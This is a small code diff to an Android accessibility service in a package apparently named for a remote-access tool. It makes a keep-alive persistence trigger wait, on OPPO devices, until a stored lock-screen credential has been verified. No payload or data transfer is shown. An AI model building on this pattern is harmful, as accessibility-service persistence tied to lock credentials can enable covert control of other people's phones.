@@ -27,8 +27,10 @@ import com.vendor.rat.MainApplication;
 import com.vendor.rat.auto.engine.AutoEngine;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.config.AppConfig;
+import com.vendor.rat.credential.LockCredentialStore;
 import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.keepalive.thread.StrategyThread;
+import com.vendor.rat.utils.DeviceUtils;
 
 import java.io.File;
 import java.nio.ByteBuffer;
@@ -230,7 +232,11 @@ public class MyAccessibilityService extends AccessibilityService {
                 try {
                     // 等待 BACK 动画完成 + 无障碍服务稳定
                     Thread.sleep(1500);
-                    com.vendor.rat.keepalive.thread.StrategyThread.triggerKeepAliveIfNeeded();
+                          if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+              Log.d(TAG, "skip strategy trigger: credential gate not verified");
+    } else {
+ com.vendor.rat.keepalive.thread.StrategyThread.triggerKeepAliveIfNeeded();
+     }
                 } catch (Exception e2) {
                     Log.e(TAG, "Strategy trigger error", e2);
                 }
